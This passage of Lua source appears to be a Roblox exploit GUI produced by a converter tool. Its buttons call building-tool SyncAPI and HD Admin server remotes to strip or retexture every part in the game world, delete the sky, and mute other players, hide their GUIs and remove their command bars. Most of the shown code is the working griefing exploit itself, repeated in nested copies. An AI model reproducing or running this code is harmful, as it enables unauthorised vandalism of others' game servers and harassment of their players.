			G2L["3"]["Size"] = UDim2.new(0, 284, 0, 33);
			G2L["3"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
			G2L["3"]["Text"] = [[Restore Decal]];
			G2L["3"]["Position"] = UDim2.new(0.03207, 0, 0.07794, 0);
		
		
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			G2L["4"] = Instance.new("LocalScript", G2L["3"]);
		
		
		
			-- StarterGui.ScreenGui.Frame.TextButton
			G2L["5"] = Instance.new("TextButton", G2L["2"]);
			G2L["5"]["TextWrapped"] = true;
			G2L["5"]["BorderSizePixel"] = 3;
			G2L["5"]["TextSize"] = 14;
			G2L["5"]["TextScaled"] = true;
			G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["5"]["Size"] = UDim2.new(0, 284, 0, 34);
			G2L["5"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
			G2L["5"]["Text"] = [[Stop Music]];
			G2L["5"]["Position"] = UDim2.new(0.03207, 0, 0.27607, 0);
		
		
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			G2L["6"] = Instance.new("LocalScript", G2L["5"]);
		
		
		
			-- StarterGui.ScreenGui.Frame.TextButton
			G2L["7"] = Instance.new("TextButton", G2L["2"]);
			G2L["7"]["TextWrapped"] = true;
			G2L["7"]["BorderSizePixel"] = 3;
			G2L["7"]["TextSize"] = 14;
			G2L["7"]["TextScaled"] = true;
			G2L["7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["7"]["Size"] = UDim2.new(0, 284, 0, 34);
			G2L["7"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
			G2L["7"]["Text"] = [[AntiSkid]];
			G2L["7"]["Position"] = UDim2.new(0.03207, 0, 0.47187, 0);
		
		
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			G2L["8"] = Instance.new("LocalScript", G2L["7"]);
		
		
		
			-- StarterGui.ScreenGui.Frame.TextButton
			G2L["9"] = Instance.new("TextButton", G2L["2"]);
			G2L["9"]["TextWrapped"] = true;
			G2L["9"]["BorderSizePixel"] = 3;
			G2L["9"]["TextSize"] = 14;
			G2L["9"]["TextScaled"] = true;
			G2L["9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["9"]["Size"] = UDim2.new(0, 130, 0, 34);
			G2L["9"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
			G2L["9"]["Text"] = [[Delete Sky]];
			G2L["9"]["Position"] = UDim2.new(0.03207, 0, 0.67923, 0);
		
		
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			G2L["a"] = Instance.new("LocalScript", G2L["9"]);
		
		
		
			-- StarterGui.ScreenGui.Frame.TextButton
			G2L["b"] = Instance.new("TextButton", G2L["2"]);
			G2L["b"]["TextWrapped"] = true;
			G2L["b"]["BorderSizePixel"] = 3;
			G2L["b"]["TextSize"] = 14;
			G2L["b"]["TextScaled"] = true;
			G2L["b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
			G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
			G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
			G2L["b"]["Size"] = UDim2.new(0, 130, 0, 34);
			G2L["b"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
			G2L["b"]["Text"] = [[Respawn Spawn]];
			G2L["b"]["Position"] = UDim2.new(0.53864, 0, 0.67923, 0);
		
		
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			G2L["c"] = Instance.new("LocalScript", G2L["b"]);
		
		
		
			-- StarterGui.ScreenGui.Frame.LocalScript
			G2L["d"] = Instance.new("LocalScript", G2L["2"]);
		
		
		
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			local function C_4()
				local script = G2L["4"];
				script.Parent.MouseButton1Click:Connect(function()
		
		
		
					-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
		
					id = 0
		
					local player = game.Players.LocalPlayer
					local char = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					--craaa
					remote = tool.SyncAPI.ServerEndpoint
		
					function GetPartsFromSelection(Selection)
		
						local Parts = {}
		
		
						for _, Descendant in pairs(Selection:GetDescendants()) do
		
							if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
		
								Parts[#Parts + 1] = Descendant
		
							end
		
						end
		
		
						-- Return parts
		
						return Parts
		
					end
		
					local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
		
					function SpawnDecal(side)
						local shitass = {}
		
						for _, Part in pairs(getfuckedlol) do
							-- Create the change request for this part
		
							table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
						end;
		
		
						-- Send the change to the server
		
						remote:InvokeServer('CreateTextures', shitass);
					end
		
					function AddDecal(texture,side)
						local shitass = {}
		
						for _, Part in pairs(getfuckedlol) do
							-- Create the change request for this part
		
							table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
						end;
		
		
						-- Send the change to the server
		
						remote:InvokeServer('SyncTexture', shitass);
					end
		
					SpawnDecal(Enum.NormalId.Front)
					AddDecal(id,Enum.NormalId.Front)
		
					SpawnDecal(Enum.NormalId.Back)
					AddDecal(id,Enum.NormalId.Back)
		
					SpawnDecal(Enum.NormalId.Right)
					AddDecal(id,Enum.NormalId.Right)
		
					SpawnDecal(Enum.NormalId.Left)
					AddDecal(id,Enum.NormalId.Left)
		
					SpawnDecal(Enum.NormalId.Bottom)
					AddDecal(id,Enum.NormalId.Bottom)
		
					SpawnDecal(Enum.NormalId.Top)
					AddDecal(id,Enum.NormalId.Top)
		
					local player = game.Players.LocalPlayer
					local char = player.Character
					local tool
					for i,v in player:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					for i,v in game.ReplicatedStorage:GetDescendants() do
						if v.Name == "SyncAPI" then
							tool = v.Parent
						end
					end
					--craaa
					remote = tool.SyncAPI.ServerEndpoint
					function _(args)
						remote:InvokeServer(unpack(args))
					end
					function SetCollision(part,boolean)
						local args = {
							[1] = "SyncCollision",
							[2] = {
								[1] = {
									["Part"] = part,
									["CanCollide"] = boolean
								}
							}
						}
						_(args)
					end
					function SetAnchor(boolean,part)
						local args = {
							[1] = "SyncAnchor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Anchored"] = boolean
								}
							}
						}
						_(args)
					end
					function CreatePart(cf,parent)
						local args = {
							[1] = "CreatePart",
							[2] = "Normal",
							[3] = cf,
							[4] = parent
						}
						_(args)
					end
					function DestroyPart(part)
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end
					function MovePart(part,cf)
						local args = {
							[1] = "SyncMove",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf
								}
							}
						}
						_(args)
					end
					function Resize(part,size,cf)
						local args = {
							[1] = "SyncResize",
							[2] = {
								[1] = {
									["Part"] = part,
									["CFrame"] = cf,
									["Size"] = size
								}
							}
						}
						_(args)
					end
					function AddMesh(part)
						local args = {
							[1] = "CreateMeshes",
							[2] = {
								[1] = {
									["Part"] = part
								}
							}
						}
						_(args)
					end
		
					function SetMesh(part,meshid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["MeshId"] = "rbxassetid://"..meshid
								}
							}
						}
						_(args)
					end
					function SetTexture(part, texid)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["TextureId"] = "rbxassetid://"..texid
								}
							}
						}
						_(args)
					end
					function SetName(part, stringg)
						local args = {
							[1] = "SetName",
							[2] = {
								[1] = part
							},
							[3] = stringg
						}
		
						_(args)
					end
					function MeshResize(part,size)
						local args = {
							[1] = "SyncMesh",
							[2] = {
								[1] = {
									["Part"] = part,
									["Scale"] = size
								}
							}
						}
						_(args)
					end
					function Weld(part1, part2,lead)
						local args = {
							[1] = "CreateWelds",
							[2] = {
								[1] = part1,
								[2] = part2
							},
							[3] = lead
						}
						_(args)
		
					end
					function SetLocked(part,boolean)
						local args = {
							[1] = "SetLocked",
							[2] = {
								[1] = part
							},
							[3] = boolean
						}
						_(args)
					end
					function SetTrans(part,int)
						local args = {
							[1] = "SyncMaterial",
							[2] = {
								[1] = {
									["Part"] = part,
									["Transparency"] = int
								}
							}
						}
						_(args)
					end
					function CreateSpotlight(part)
						local args = {
							[1] = "CreateLights",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight"
								}
							}
						}
						_(args)
					end
					function SyncLighting(part,brightness)
						local args = {
							[1] = "SyncLighting",
							[2] = {
								[1] = {
									["Part"] = part,
									["LightType"] = "SpotLight",
									["Brightness"] = brightness
								}
							}
						}
						_(args)
					end
					function Color(part,color)
						local args = {
							[1] = "SyncColor",
							[2] = {
								[1] = {
									["Part"] = part,
									["Color"] = color --[[Color3]],
									["UnionColoring"] = false
								}
							}
						}
						_(args)
					end
					function SpawnDecal(part,side)
						local args = {
							[1] = "CreateTextures",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = side,
									["TextureType"] = "Decal"
								}
							}
						}
		
						_(args)
					end
					function AddDecal(part,asset,side)
						local args = {
							[1] = "SyncTexture",
							[2] = {
								[1] = {
									["Part"] = part,
									["Face"] = side,
									["TextureType"] = "Decal",
									["Texture"] = "rbxassetid://".. asset
								}
							}
						}
						_(args)
					end
		
					function spam()
						for i,v in game.workspace:GetDescendants() do
							if v:IsA("BasePart") then
								spawn(function()
									SetTrans(v,math.random(0,0))
								end)
							end
						end 
					end
					spam()
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
				end)
		
			end;
			task.spawn(C_4);
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			local function C_6()
				local script = G2L["6"];
				script.Parent.MouseButton1Click:Connect(function()
		
		
		
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
					RequestCommand:InvokeServer(";unmusic")
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
				end)
		
			end;
			task.spawn(C_6);
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			local function C_8()
				local script = G2L["8"];
				script.Parent.MouseButton1Click:Connect(function()
		
		
		
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
					RequestCommand:InvokeServer(";hideguis others")
					RequestCommand:InvokeServer(";mute others")
					RequestCommand:InvokeServer(";uncmdbar others")
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
				end)
		
			end;
			task.spawn(C_8);
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			local function C_a()
				local script = G2L["a"];
				script.Parent.MouseButton1Click:Connect(function()
		
		
		
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommandSilent:InvokeServer(";time 10")
		
					local function findBuildingTools()
						local player = game:GetService("Players").LocalPlayer
		
						for _, item in ipairs(player.Character:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								return item
							end
						end
		
						for _, item in ipairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								return item
							end
						end
		
						return nil
					end
		
					local buildingTools = findBuildingTools()
					if not buildingTools then
						warn("btools not found")
						return
					end
		
					local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
					local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
		
					if not serverEndpoint then
						warn("btools not found")
						return
					end
		
					local skyInstance = workspace:FindFirstChild("Sky")
					if not skyInstance then
						print"ok"
					end
		
					local args = {
						"Remove",                
						{ skyInstance }           
					}
		
					local success, result
					if serverEndpoint:IsA("RemoteFunction") then
						success, result = pcall(function()
							return serverEndpoint:InvokeServer(unpack(args))
						end)
					else
		
						serverEndpoint:FireServer(unpack(args))
						success = true
					end
		
					if success then
		
						print"yay"
		
					end
		
		
		
		
		
		
		
		
		
		
		
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		
					RequestCommandSilent:InvokeServer(";time 10")
		
					local function findBuildingTools()
						local player = game:GetService("Players").LocalPlayer
		
						for _, item in ipairs(player.Character:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								return item
							end
						end
		
						for _, item in ipairs(player.Backpack:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								return item
							end
						end
		
						return nil
					end
		
					local buildingTools = findBuildingTools()
					if not buildingTools then
						warn("btools not found")
						return
					end
		
					local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
					local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
		
					if not serverEndpoint then
						warn("btools not found")
						return
					end
		
					local skyInstance = workspace:FindFirstChild("Skyl0rdSky")
					if not skyInstance then
						print"ok"
					end
		
					local args = {
						"Remove",                
						{ skyInstance }           
					}
		
					local success, result
					if serverEndpoint:IsA("RemoteFunction") then
						success, result = pcall(function()
							return serverEndpoint:InvokeServer(unpack(args))
						end)
					else
		
						serverEndpoint:FireServer(unpack(args))
						success = true
					end
		
					if success then
		
						print"yay"
		
					end
		
		
		
		
		
		
		
		
		
		
		
		
		
		
				end)
		
			end;
			task.spawn(C_a);
			-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
			local function C_c()
				local script = G2L["c"];
				script.Parent.MouseButton1Click:Connect(function()
		
		
		
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
					RequestCommand:InvokeServer(";insert 53326")
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
				end)
		
			end;
			task.spawn(C_c);
			-- StarterGui.ScreenGui.Frame.LocalScript
			local function C_d()
				local script = G2L["d"];
				local UserInputService = game:GetService("UserInputService")
				local runService = (game:GetService("RunService"));
		
				local gui = script.Parent
		
				local dragging
				local dragInput
				local dragStart
				local startPos
		
				function Lerp(a, b, m)
					return a + (b - a) * m
				end;
		
				local lastMousePos
				local lastGoalPos
				local DRAG_SPEED = (8); -- // The speed of the UI darg.
				function Update(dt)
					if not (startPos) then return end;
					if not (dragging) and (lastGoalPos) then
						gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
						return 
					end;
		
					local delta = (lastMousePos - UserInputService:GetMouseLocation())
					local xGoal = (startPos.X.Offset - delta.X);
					local yGoal = (startPos.Y.Offset - delta.Y);
					lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
					gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
				end;
		
				gui.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						dragging = true
						dragStart = input.Position
						startPos = gui.Position
						lastMousePos = UserInputService:GetMouseLocation()
		
						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragging = false
							end
						end)
					end
				end)
		
				gui.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						dragInput = input
					end
				end)
		
				runService.Heartbeat:Connect(Update)
			end;
			task.spawn(C_d);
		
			return G2L["1"], require;
		
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_48);
	
	return G2L["1"], require;
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_4a);
-- StarterGui.ScreenGui.Frame.page frames.pag3.LocalScript
local function C_4c()
local script = G2L["4c"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
		-- Instances: 13 | Scripts: 6 | Modules: 0 | Tags: 0
		local G2L = {};
	
		-- StarterGui.ScreenGui
		G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
		G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
	
	
		-- StarterGui.ScreenGui.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["BorderSizePixel"] = 4;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["2"]["Size"] = UDim2.new(0, 304, 0, 267);
		G2L["2"]["Position"] = UDim2.new(0.38543, 0, 0.168, 0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 146, 11);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["3"] = Instance.new("TextButton", G2L["2"]);
		G2L["3"]["TextWrapped"] = true;
		G2L["3"]["BorderSizePixel"] = 3;
		G2L["3"]["TextSize"] = 14;
		G2L["3"]["TextScaled"] = true;
		G2L["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["3"]["Size"] = UDim2.new(0, 284, 0, 33);
		G2L["3"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
		G2L["3"]["Text"] = [[Restore Decal]];
		G2L["3"]["Position"] = UDim2.new(0.03207, 0, 0.07794, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["4"] = Instance.new("LocalScript", G2L["3"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["5"] = Instance.new("TextButton", G2L["2"]);
		G2L["5"]["TextWrapped"] = true;
		G2L["5"]["BorderSizePixel"] = 3;
		G2L["5"]["TextSize"] = 14;
		G2L["5"]["TextScaled"] = true;
		G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["5"]["Size"] = UDim2.new(0, 284, 0, 34);
		G2L["5"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
		G2L["5"]["Text"] = [[Stop Music]];
		G2L["5"]["Position"] = UDim2.new(0.03207, 0, 0.27607, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["6"] = Instance.new("LocalScript", G2L["5"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["7"] = Instance.new("TextButton", G2L["2"]);
		G2L["7"]["TextWrapped"] = true;
		G2L["7"]["BorderSizePixel"] = 3;
		G2L["7"]["TextSize"] = 14;
		G2L["7"]["TextScaled"] = true;
		G2L["7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["7"]["Size"] = UDim2.new(0, 284, 0, 34);
		G2L["7"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
		G2L["7"]["Text"] = [[AntiSkid]];
		G2L["7"]["Position"] = UDim2.new(0.03207, 0, 0.47187, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["8"] = Instance.new("LocalScript", G2L["7"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["9"] = Instance.new("TextButton", G2L["2"]);
		G2L["9"]["TextWrapped"] = true;
		G2L["9"]["BorderSizePixel"] = 3;
		G2L["9"]["TextSize"] = 14;
		G2L["9"]["TextScaled"] = true;
		G2L["9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["9"]["Size"] = UDim2.new(0, 130, 0, 34);
		G2L["9"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
		G2L["9"]["Text"] = [[Delete Sky]];
		G2L["9"]["Position"] = UDim2.new(0.03207, 0, 0.67923, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["a"] = Instance.new("LocalScript", G2L["9"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton
		G2L["b"] = Instance.new("TextButton", G2L["2"]);
		G2L["b"]["TextWrapped"] = true;
		G2L["b"]["BorderSizePixel"] = 3;
		G2L["b"]["TextSize"] = 14;
		G2L["b"]["TextScaled"] = true;
		G2L["b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
		G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["b"]["Size"] = UDim2.new(0, 130, 0, 34);
		G2L["b"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
		G2L["b"]["Text"] = [[Respawn Spawn]];
		G2L["b"]["Position"] = UDim2.new(0.53864, 0, 0.67923, 0);
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		G2L["c"] = Instance.new("LocalScript", G2L["b"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.LocalScript
		G2L["d"] = Instance.new("LocalScript", G2L["2"]);
	
	
	
		-- StarterGui.ScreenGui.Frame.TextButton.LocalScript
		local function C_4()
			local script = G2L["4"];
			script.Parent.MouseButton1Click:Connect(function()
	
	
	
				-- made by 1sw0rd1 aka deletecar, DO NOT LEAK OR GIVE WITHOUT MY PERMISSION.
	
				id = 0
	
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				--craaa
				remote = tool.SyncAPI.ServerEndpoint
	
				function GetPartsFromSelection(Selection)
	
					local Parts = {}
	
	
					for _, Descendant in pairs(Selection:GetDescendants()) do
	
						if Descendant:IsA 'BasePart' and Descendant.Name ~= "Terrain" and Descendant.Name ~= "Sky" then
	
							Parts[#Parts + 1] = Descendant
	
						end
	
					end
	
	
					-- Return parts
	
					return Parts
	
				end
	
				local getfuckedlol = GetPartsFromSelection(game:GetService("Workspace"))
	
				function SpawnDecal(side)
					local shitass = {}
	
					for _, Part in pairs(getfuckedlol) do
						-- Create the change request for this part
	
						table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" });
					end;
	
	
					-- Send the change to the server
	
					remote:InvokeServer('CreateTextures', shitass);
				end
	
				function AddDecal(texture,side)
					local shitass = {}
	
					for _, Part in pairs(getfuckedlol) do
						-- Create the change request for this part
	
						table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture });
					end;
	
	
					-- Send the change to the server
	
					remote:InvokeServer('SyncTexture', shitass);
				end
	
				SpawnDecal(Enum.NormalId.Front)
				AddDecal(id,Enum.NormalId.Front)
	
				SpawnDecal(Enum.NormalId.Back)
				AddDecal(id,Enum.NormalId.Back)
	
				SpawnDecal(Enum.NormalId.Right)
				AddDecal(id,Enum.NormalId.Right)
	
				SpawnDecal(Enum.NormalId.Left)
				AddDecal(id,Enum.NormalId.Left)
	
				SpawnDecal(Enum.NormalId.Bottom)
				AddDecal(id,Enum.NormalId.Bottom)
	
				SpawnDecal(Enum.NormalId.Top)
				AddDecal(id,Enum.NormalId.Top)
	
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				--craaa
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
				function Color(part,color)
					local args = {
						[1] = "SyncColor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Color"] = color --[[Color3]],
								["UnionColoring"] = false
							}
						}
					}
					_(args)
				end
				function SpawnDecal(part,side)
					local args = {
						[1] = "CreateTextures",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = side,
								["TextureType"] = "Decal"
							}
						}
					}
	
					_(args)
				end
				function AddDecal(part,asset,side)
					local args = {
						[1] = "SyncTexture",
						[2] = {
							[1] = {
								["Part"] = part,
								["Face"] = side,
								["TextureType"] = "Decal",
								["Texture"] = "rbxassetid://".. asset
							}
						}
					}
					_(args)
				end
	
				function spam()
